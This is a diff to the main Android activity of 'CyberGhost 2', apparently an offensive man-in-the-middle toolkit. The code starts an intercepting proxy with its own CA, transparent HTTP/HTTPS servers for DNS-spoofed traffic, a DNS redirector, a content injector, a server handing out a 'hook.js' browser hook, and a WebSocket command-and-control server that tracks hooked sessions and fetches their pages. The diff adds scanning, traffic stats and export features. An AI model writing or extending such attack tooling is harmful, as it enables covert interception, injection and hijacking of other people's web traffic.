@@ -1,13 +1,13 @@
 package com.cyberghost
 
+import android.app.NotificationChannel
+import android.app.NotificationManager
 import android.os.Bundle
 import android.util.Log
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
-import androidx.compose.material3.MaterialTheme
-import androidx.compose.material3.darkColorScheme
 import androidx.compose.runtime.*
-import androidx.compose.ui.graphics.Color
+import androidx.core.app.NotificationCompat
 import com.cyberghost.core.*
 import com.cyberghost.ui.*
 import kotlinx.coroutines.launch
@@ -15,14 +15,6 @@ import android.content.Intent
 import android.net.Uri
 import androidx.core.content.FileProvider
 import java.io.File
-
-private val CyberGhostColors = darkColorScheme(
-    background = Color(0xFF080808),
-    surface = Color(0xFF111111),
-    primary = Color(0xFF00FF41),
-    onBackground = Color(0xFFCCCCCC),
-    onSurface = Color(0xFFCCCCCC)
-)
 
 class MainActivity : ComponentActivity() {
 
@@ -36,20 +28,26 @@ class MainActivity : ComponentActivity() {
     private var transparentHttp: TransparentHttpServer? = null
     private var transparentHttps: TransparentHttpsServer? = null
     private var hookJs: String = ""
+    private val trafficStats = TrafficStats()
+    private val networkMapper = NetworkMapper()
+    private val certViewer = SslCertViewer()
+    private lateinit var profileManager: ProfileManager
+    private lateinit var packetExporter: PacketExporter
+    private val certInfoCache = mutableMapOf<String, CertInfo>()
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         Log.i("CG2", "MainActivity onCreate")
 
-        try {
-            hookJs = assets.open("hook.js").bufferedReader().readText()
-        } catch (e: Exception) {
-            Log.e("CG2", "Failed to load hook.js", e)
-            hookJs = "// hook.js load failed"
-        }
+        profileManager = ProfileManager(this)
+        packetExporter = PacketExporter(this)
+        createNotificationChannel()
+
+        try { hookJs = assets.open("hook.js").bufferedReader().readText() }
+        catch (e: Exception) { Log.e("CG2", "hook.js load failed", e); hookJs = "// failed" }
 
         setContent {
-            MaterialTheme(colorScheme = CyberGhostColors) {
+            CyberGhostTheme {
                 val packets = remember { mutableStateListOf<InterceptedPacket>() }
                 val interceptQueue = remember { mutableStateListOf<PendingIntercept>() }
                 val devices = remember { mutableStateListOf<ConnectedDevice>() }
@@ -58,6 +56,10 @@ class MainActivity : ComponentActivity() {
                 var mode by remember { mutableStateOf(InterceptMode.PASSTHROUGH) }
                 var config by remember { mutableStateOf(InjectionConfig()) }
                 var hookedSessions by remember { mutableStateOf<List<HookedSession>>(emptyList()) }
+                val networkHosts by networkMapper.hosts.collectAsState()
+                val isScanning by networkMapper.scanning.collectAsState()
+                var profiles by remember { mutableStateOf(profileManager.list()) }
+                var certInfos by remember { mutableStateOf<Map<String, CertInfo>>(emptyMap()) }
 
                 LaunchedEffect(isRunning) {
                     if (isRunning) {
@@ -67,77 +69,58 @@ class MainActivity : ComponentActivity() {
                             if (contentInjector == null) contentInjector = ContentInjector()
                             contentInjector?.config = config
 
-                            // explicit proxy (manual config on target)
                             proxy = InterceptProxy(8080, certManager!!, contentInjector!!).also { p ->
                                 p.mode = mode; p.start()
                                 launch {
                                     p.packets.collect { pkt ->
                                         packets.add(pkt); if (packets.size > 2000) packets.removeAt(0)
                                         deviceManager?.trackRequest(pkt.sourceIp, pkt.headers["User-Agent"], pkt.body.size.toLong())
+                                        trafficStats.recordPacket(pkt)
                                     }
                                 }
                             }
-
-                            // transparent servers (DNS-spoofed traffic lands here)
                             transparentHttp = TransparentHttpServer(80, proxy!!, contentInjector!!).also { it.start() }
                             transparentHttps = TransparentHttpsServer(443, proxy!!, certManager!!, contentInjector!!).also { it.start() }
-
                             mediaServer = MediaServer(9090, this@MainActivity, hookJs).also { it.start() }
                             c2Server = WebSocketC2Server(9091, deviceManager!!).also { c2 ->
                                 c2.start()
                                 launch { c2.events.collect { event -> events.add(event); if (events.size > 500) events.removeAt(0) } }
                             }
-
-                            // DNS with transparent redirect enabled
-                            dnsCapture = DnsCapture(
-                                listenPort = 5353,
-                                gatewayIp = "192.168.43.1",
-                                transparentMode = true
-                            ).also { it.start() }
-
+                            dnsCapture = DnsCapture(5353, gatewayIp = "192.168.43.1", transparentMode = true).also { dns ->
+                                dns.start()
+                                launch { dns.queries.collect { trafficStats.recordDns() } }
+                            }
                             launch {
                                 while (true) {
                                     kotlinx.coroutines.delay(500)
-                                    deviceManager?.let { dm ->
-                                        devices.clear(); devices.addAll(dm.getAllDevices())
-                                        hookedSessions = dm.getHookedSessions()
-                                    }
+                                    deviceManager?.let { dm -> devices.clear(); devices.addAll(dm.getAllDevices()); hookedSessions = dm.getHookedSessions() }
+                                    updateNotification(devices.size, hookedSessions.count { it.isAlive }, trafficStats.totalPackets.get())
                                 }
                             }
-                            Log.i("CG2", "All engines started (transparent mode)")
+                            showNotification("Engines started")
+                            Log.i("CG2", "All engines started")
                         } catch (e: Exception) {
-                            Log.e("CG2", "Engine start failed", e)
-                            isRunning = false
+                            Log.e("CG2", "Start failed", e); isRunning = false
                         }
                     } else {
-                        proxy?.stop(); proxy = null
-                        transparentHttp?.stop(); transparentHttp = null
-                        transparentHttps?.stop(); transparentHttps = null
-                        c2Server?.stop(); c2Server = null
-                        mediaServer?.stop(); mediaServer = null
-                        dnsCapture?.stop(); dnsCapture = null
+                        proxy?.stop(); proxy = null; transparentHttp?.stop(); transparentHttp = null
+                        transparentHttps?.stop(); transparentHttps = null; c2Server?.stop(); c2Server = null
+                        mediaServer?.stop(); mediaServer = null; dnsCapture?.stop(); dnsCapture = null
+                        cancelNotification()
                     }
                 }
 
                 LaunchedEffect(mode) { proxy?.mode = mode }
                 LaunchedEffect(config) { contentInjector?.config = config }
-
                 LaunchedEffect(isRunning) {
-                    if (isRunning) {
-                        launch {
-                            while (true) {
-                                kotlinx.coroutines.delay(200)
-                                val current = proxy?.interceptQueue?.toList() ?: emptyList()
-                                interceptQueue.clear(); interceptQueue.addAll(current)
-                            }
-                        }
-                    }
+                    if (isRunning) { launch { while (true) { kotlinx.coroutines.delay(200); interceptQueue.clear(); interceptQueue.addAll(proxy?.interceptQueue?.toList() ?: emptyList()) } } }
                 }
 
-                CyberGhostScreen(
+                CyberGhostApp(
                     interceptQueue = interceptQueue, packets = packets, devices = devices,
-                    hookedSessions = hookedSessions, mode = mode,
-                    isRunning = isRunning, events = events,
+                    hookedSessions = hookedSessions, mode = mode, isRunning = isRunning,
+                    events = events, networkHosts = networkHosts, isScanning = isScanning,
+                    trafficStats = trafficStats, profiles = profiles, certInfos = certInfos,
                     onModeChange = { mode = it }, onToggle = { isRunning = !isRunning },
                     onForward = { id, pkt -> proxy?.forwardPacket(id, pkt) },
                     onDrop = { id -> proxy?.dropPacket(id) },
@@ -156,7 +139,20 @@ class MainActivity : ComponentActivity() {
                             "get_dom" -> c2Server?.getDom(session)
                         }
                     },
-                    onExportCa = { exportCa() }, onConfigUpdate = { config = it }, currentConfig = config
+                    onExportCa = { exportCa() },
+                    onExportHar = { val file = packetExporter.exportHar(packets.toList()); file?.let { packetExporter.shareFile(it) } },
+                    onConfigUpdate = { config = it },
+                    onScanNetwork = { networkMapper.scan() },
+                    onSaveProfile = { name -> profileManager.save(name, config); profiles = profileManager.list() },
+                    onLoadProfile = { name -> profileManager.load(name)?.let { config = it } },
+                    onDeleteProfile = { name -> profileManager.delete(name); profiles = profileManager.list() },
+                    onSetNickname = { ip, name -> deviceManager?.getDevice(ip)?.hostname = name },
+                    onInspectCert = { host ->
+                        kotlinx.coroutines.MainScope().launch {
+                            val info = certViewer.inspect(host)
+                            info?.let { certInfoCache[host] = it; certInfos = certInfoCache.toMap() }
+                        }
+                    }
                 )
             }
         }
@@ -165,24 +161,36 @@ class MainActivity : ComponentActivity() {
     private fun exportCa() {
         try {
             val pem = certManager?.getCaCertPem() ?: return
-            val file = File(cacheDir, "cyberghost_ca.crt")
-            file.writeText(pem)
+            val file = File(cacheDir, "cyberghost_ca.crt"); file.writeText(pem)
             val uri: Uri = FileProvider.getUriForFile(this, "$packageName.fileprovider", file)
-            startActivity(Intent.createChooser(
-                Intent(Intent.ACTION_SEND).apply {
-                    type = "application/x-x509-ca-cert"
-                    putExtra(Intent.EXTRA_STREAM, uri)
-                    addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
-                }, "Export CyberGhost CA"
-            ))
-        } catch (e: Exception) {
-            Log.e("CG2", "CA export failed", e)
-        }
+            startActivity(Intent.createChooser(Intent(Intent.ACTION_SEND).apply {
+                type = "application/x-x509-ca-cert"; putExtra(Intent.EXTRA_STREAM, uri); addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
+            }, "Export CyberGhost CA"))
+        } catch (e: Exception) { Log.e("CG2", "CA export failed", e) }
+    }
+
+    private fun createNotificationChannel() {
+        val channel = NotificationChannel("cg2_status", "CyberGhost Status", NotificationManager.IMPORTANCE_LOW).apply { setShowBadge(false) }
+        getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
+    }
+
+    private fun showNotification(text: String) {
+        val n = NotificationCompat.Builder(this, "cg2_status").setContentTitle("CyberGhost 2").setContentText(text)
+            .setSmallIcon(android.R.drawable.ic_menu_manage).setOngoing(true).build()
+        getSystemService(NotificationManager::class.java).notify(1337, n)
+    }
+
+    private fun updateNotification(devices: Int, hooked: Int, packets: Long) {
+        showNotification("D:$devices H:$hooked P:$packets")
+    }
+
+    private fun cancelNotification() {
+        getSystemService(NotificationManager::class.java).cancel(1337)
     }
 
     override fun onDestroy() {
         proxy?.stop(); transparentHttp?.stop(); transparentHttps?.stop()
         c2Server?.stop(); mediaServer?.stop(); dnsCapture?.stop()
-        super.onDestroy()
+        cancelNotification(); super.onDestroy()
     }
 }
